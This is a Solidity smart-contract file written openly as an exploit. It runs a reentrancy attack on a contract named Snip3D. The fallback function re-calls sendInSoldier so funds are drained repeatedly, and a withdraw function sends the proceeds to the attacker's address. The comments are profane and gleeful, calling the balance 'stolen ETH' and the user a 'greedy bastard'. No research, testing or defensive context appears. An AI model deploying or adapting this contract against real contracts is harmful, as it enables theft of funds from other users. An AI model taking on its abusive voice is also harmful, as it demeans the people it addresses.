pragma solidity ^0.4.25;

contract ReentrancyAttack {
    Snip3D target; // The Snip3D contract we’re hitting
    uint256 reentryCount = 2; // How many times to reenter (adjust later)
    address owner; // You, the greedy bastard

    constructor(address _target) public {
        target = Snip3D(_target);
        owner = msg.sender;
    }

    // Fallback function: Triggers when Snip3D sends ETH
    function() external payable {
        if (reentryCount > 0) {
            reentryCount--;
            target.sendInSoldier(address(0)); // Reenter Snip3D
        }
    }

    // Start the attack
    function attack() public payable {
        require(msg.value >= 0.1 ether, "Send at least 0.1 ETH, dumbass");
        target.sendInSoldier.value(0.1 ether)(address(0));
    }

    // Withdraw your loot
    function withdraw() public {
        require(msg.sender == owner, "Fuck off, not yours");
        msg.sender.transfer(address(this).balance);
    }

    // Check your stolen ETH
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

interface Snip3D {
    function sendInSoldier(address masternode) external payable;
}